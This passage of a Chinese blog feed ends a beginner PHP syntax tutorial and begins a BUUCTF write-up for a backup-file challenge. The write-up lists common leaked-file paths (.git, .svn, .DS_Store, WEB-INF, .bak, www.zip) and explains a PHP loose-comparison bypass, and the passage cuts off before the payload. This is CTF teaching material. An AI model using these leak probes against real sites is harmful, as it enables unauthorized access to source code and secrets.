class="comment">多行</span></span><br><span class="line"><span class="comment">注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>PHP的变量以$开头</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">6</span>;</span></span><br><span class="line"><span class="php">$z=$x+$y;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $z;</span></span><br></pre></td></tr></table></figure><p>运行结果为<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure></p><h2 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h2><p>PHP的变量规则与C语言很像<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">变量以<span class="variable">$符</span>号开始，后面跟着变量名称</span><br><span class="line">变量名必须以字母或者下划线字符开始</span><br><span class="line">变量名只能包含字母数字字符以及下划线</span><br><span class="line">变量名不能包括空格</span><br><span class="line">变量名区分大小写</span><br></pre></td></tr></table></figure></p><h2 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta"><span class="meta-keyword">$txt</span>="Hello world!";</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span>=5;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$y</span>=10.5;</span></span><br></pre></td></tr></table></figure><p>将文本值给变量时，文本值两次加上引号</p><p>这里可以看出PHP是一门弱类型语言，不用提前声明好变量的类型，直接声明赋值即可</p><h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> 局部</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> 全局</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> 静态</span><br></pre></td></tr></table></figure><h3 id="global关键字"><a href="#global关键字" class="headerlink" title="global关键字"></a>global关键字</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">global</span> $x,$y;</span></span><br><span class="line"><span class="php">    $y=$x+$y;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y; <span class="comment">// 输出 15</span></span></span><br></pre></td></tr></table></figure><p>可以看到x,y在函数外进行了声明，在函数中添加了global关键字，对其进行了运算操作</p><p>PHP将所有全局变量都存储在一个名为$GLOBALS[index]的数组中。index保存变量的名称，这个数组可以在函数内部访问，也可以直接用来更新全局变量</p><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php">$y=<span class="number">10</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $GLOBALS[<span class="string">'y'</span>]=$GLOBALS[<span class="string">'x'</span>]+$GLOBALS[<span class="string">'y'</span>];</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $y;</span></span><br></pre></td></tr></table></figure><br>运行结果仍为15</p><h3 id="static作用域"><a href="#static作用域" class="headerlink" title="static作用域"></a>static作用域</h3><p>一个函数完成时，所有的变量都会被删除，但是有时候希望某个局部变量不要被删除，就需要使用static关键字</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> $x=<span class="number">0</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $x;</span></span><br><span class="line"><span class="php">    $x++;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> PHP_EOL;    <span class="comment">// 换行符</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php">myTest();</span></span><br><span class="line"><span class="php">myTest();</span></span><br></pre></td></tr></table></figure><p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><br>每次调用该函数时，该变量将会保留着函数前一次被调用时的值</p><h3 id="参数作用域"><a href="#参数作用域" class="headerlink" title="参数作用域"></a>参数作用域</h3><p>参数是在参数列表中声明的，也可以作为函数声明的一部分<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">myTest</span><span class="params">($x)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $x;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">myTest(<span class="number">5</span>);</span></span><br></pre></td></tr></table></figure><br>运行结果为5</p><p>这个类似于是C语言的带参函数</p><h1 id="echo和print"><a href="#echo和print" class="headerlink" title="echo和print"></a>echo和print</h1><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 可以输出一个或多个字符串</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> 只允许输出一个字符串，返回值总为1</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>输出的速度比<span class="built_in">print</span>快，<span class="built_in">echo</span>没有返回值，<span class="built_in">print</span>返回值为1</span><br></pre></td></tr></table></figure><h2 id="echo语句"><a href="#echo语句" class="headerlink" title="echo语句"></a>echo语句</h2><p>echo是一个语言结构，使用时可以不加上括号，也可以加上:echo或echo()</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="number">5</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello world!\n"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span>($x);</span></span><br></pre></td></tr></table></figure><p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello world!</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></p><h2 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h2><p>和echo差不多，可以带括号也可以不带<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$x</span>=5;</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"Hello world!\n"</span>;</span><br><span class="line"><span class="builtin-name">print</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure></p><p>运行结果：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello world!</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></p><h1 id="EOF使用说明"><a href="#EOF使用说明" class="headerlink" title="EOF使用说明"></a>EOF使用说明</h1><p>PHP EOF(heredoc)是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法</p><p>概述<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">必须后接分号，否则编译不通过</span><br><span class="line"></span><br><span class="line"><span class="built_in">EOF</span> 可以用任意其它字符代替，只需保证结束标识与开始标识一致。</span><br><span class="line"></span><br><span class="line">结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。</span><br><span class="line"></span><br><span class="line">开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号</span><br><span class="line"></span><br><span class="line">当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法</span><br></pre></td></tr></table></figure></p><p>例如<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$name=<span class="string">"runoob"</span>;</span></span><br><span class="line"><span class="php">$a= <span class="string">&lt;&lt;&lt;EOF</span></span></span><br><span class="line"><span class="php">        <span class="string">"abc"</span>$name</span></span><br><span class="line"><span class="php">        <span class="string">"123"</span></span></span><br><span class="line"><span class="php">EOF;</span></span><br><span class="line"><span class="php"><span class="comment">// 结束需要独立一行且前后不能空格</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $a;</span></span><br></pre></td></tr></table></figure><br>运行结果：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"abc"</span>runoob</span><br><span class="line"><span class="string">"123"</span></span><br></pre></td></tr></table></figure></p><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><p>String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>一个字符串是一串字符的序列，就像”Hello World”<br>可以将任何文本放在单引号和双引号中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">$x = <span class="string">'Hello world!'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $x;</span></span><br></pre></td></tr></table></figure><p>运行结果:<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello world!</span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure></p><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><p>整型顾名思义就是没有小数点的数字<br>规则<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">整型必须至少有一个数字(<span class="number">0</span><span class="number">-9</span>)</span><br><span class="line"></span><br><span class="line">整数不能包括逗号或空格</span><br><span class="line"></span><br><span class="line">整数是没有小数点的</span><br><span class="line"></span><br><span class="line">整数可以是正数或负数</span><br><span class="line"></span><br><span class="line">可以以十进制，十六进制(<span class="number">0</span>x开头)，八进制(<span class="number">0</span>开头)</span><br></pre></td></tr></table></figure><br>var_dump()函数可以返回变量的数据类型和值：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x = <span class="number">5985</span>;</span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">$x = <span class="number">-345</span>; <span class="comment">// 负数</span></span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">$x = <span class="number">0x8C</span>; <span class="comment">// 十六进制数</span></span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br><span class="line"><span class="php">$x = <span class="number">047</span>; <span class="comment">// 八进制数</span></span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">5985</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(-<span class="number">345</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">140</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">int</span><span class="params">(<span class="number">39</span>)</span></span></span><br></pre></td></tr></table></figure></p><h2 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h2><p>浮点型是带小数部分的数字，或是指数形式<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span> = 10.365;</span></span><br><span class="line">var_dump(<span class="symbol">$</span>x);</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span> = 2.4e3;</span></span><br><span class="line">var_dump(<span class="symbol">$</span>x);</span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="meta-keyword">$x</span> = 8E-5;</span></span><br><span class="line">var_dump(<span class="symbol">$</span>x);</span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">float</span><span class="params">(<span class="number">10.365</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">(<span class="number">2400</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">float</span><span class="params">(<span class="number">8.0</span>E-<span class="number">5</span>)</span></span></span><br></pre></td></tr></table></figure></p><h2 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h2><p>布尔型只有两个类型True或False<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$x=<span class="literal">true</span><span class="comment">;</span></span><br><span class="line">$y=<span class="literal">false</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><br>这个用于判断，流程控制</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组可以在一个变量中存储多个值<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php">var_dump($cars);</span></span><br></pre></td></tr></table></figure><br>运行结果:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">5</span>) <span class="string">"Volvo"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">3</span>) <span class="string">"BMW"</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="type">string</span>(<span class="number">6</span>) <span class="string">"Toyota"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>对象数据类型也可以用于存储数据<br>在PHP中，对象必须声明</p><p>首先，你必须使用class关键字声明类对象，类可以包含属性和方法的结构</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $color;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($color=<span class="string">"green"</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;color = $color;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">what_color</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;color;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h2><p>NULL值表示变量没有值。NULL是数据类型为NULL的值</p><p>NULL值指明一个变量是否为空值。同样可以用于数据空值和NULL值的区别</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$x=<span class="string">"Hello world!"</span>;</span></span><br><span class="line"><span class="php">$x=<span class="keyword">null</span>;</span></span><br><span class="line"><span class="php">var_dump($x);</span></span><br></pre></td></tr></table></figure><p>运行结果:<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">NULL</span></span><br></pre></td></tr></table></figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.&lt;?PHP开始，以?&gt;结束，这一项在有HTML代码的时候，必须要以?&gt;结尾，调试时可以不用</p><p>2.PHP在版本更新之后，echo和print可以带括号，也可以不带括号</p><p>3.PHP是弱类型语言，不用提前声明变量的数据类型</p><p>4.global关键字使用时，会将声明的变量都添加到$GLOBALS[index]中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;PHP全称是超文本预处理器，是一种通用开源脚本语言&lt;/p&gt;
&lt;p&gt;可以包含文本，HTML，JavaScript和PHP代码&lt;/p&gt;
&lt;p&gt;可
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="PHP" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/PHP/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-Nepnep-WEB-1</title>
    <link href="http://yoursite.com/2020/05/09/BUUCTF-Nepnep-WEB-1/"/>
    <id>http://yoursite.com/2020/05/09/BUUCTF-Nepnep-WEB-1/</id>
    <published>2020-05-09T12:13:00.000Z</published>
    <updated>2020-05-20T02:04:25.874Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>打开之后得到一句话：<br>Try to find out source file!</p><p>尝试找到源文件，所以尝试了一下source.php，但是发现404</p><p>接着有尝试了index.php，随后想到了文件泄露</p><p>也可以用御剑扫出来</p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="敏感文件泄露"><a href="#敏感文件泄露" class="headerlink" title="敏感文件泄露"></a>敏感文件泄露</h3><p>常见的敏感文件泄露主要分为</p><h4 id="版本管理软件造成的泄露"><a href="#版本管理软件造成的泄露" class="headerlink" title="版本管理软件造成的泄露"></a>版本管理软件造成的泄露</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">git</span></span><br><span class="line"><span class="symbol">hg</span></span><br><span class="line"><span class="symbol">svn</span></span><br><span class="line"><span class="keyword">bzr</span></span><br><span class="line"><span class="keyword">cvs</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">以上除了git，均可以使用dvcs-ripper工具来利用</span></span><br></pre></td></tr></table></figure><h4 id="文件包含导致的泄露"><a href="#文件包含导致的泄露" class="headerlink" title="文件包含导致的泄露"></a>文件包含导致的泄露</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">WEB-INF</span><br><span class="line"></span><br><span class="line">.DS_Store利用方法为 XXX/.DS_Store</span><br><span class="line"></span><br><span class="line">WEB-INF：</span><br><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line">WEB-INF/<span class="class"><span class="keyword">lib</span>/ : 用来存放打包好的库(.<span class="title">jar</span>)</span></span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><h4 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.swp</span><br><span class="line">.bak</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.tar</span><br><span class="line"></span><br><span class="line">.swp和.bak利用方法为:index<span class="selector-class">.php</span>.swp(.bak)</span><br><span class="line"></span><br><span class="line">XXX/www.zip(rar,tar)</span><br></pre></td></tr></table></figure><p>具体参考一下这些文章<br><a href="https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html" target="_blank" rel="noopener">https://www.cnblogs.com/pannengzhi/p/2017-09-23-web-file-disclosure.html</a><br><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p>dvcs-ripper工具使用方法<br><a href="https://www.codetd.com/article/9717496" target="_blank" rel="noopener">https://www.codetd.com/article/9717496</a></p><h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><p>这里的是bak备份文件泄露，index.php.bak即可下载到源码<br>使用notepad打开<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        echo <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>分析代码可以知道，key参数以GET方式接受用户输入，利用了is_numeric来判断是否为数字，又利用了intval获取key的整数值</p><p>接下来看到str变量是123开头的一个字符串，str与key之间采用了==来进行判断，之前提到过===；</p><p>===和==个人理解下来就是前者为强判断，要求数据类型，长度和内容都要相同</p><p>PHP的弱类型特性==，int和string是无法直接比较的，php会将string转换成int然后再进行比较，转换成int比较时只保留数字，第一个字符串之后的所有内容会被截掉</p><p>payload:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 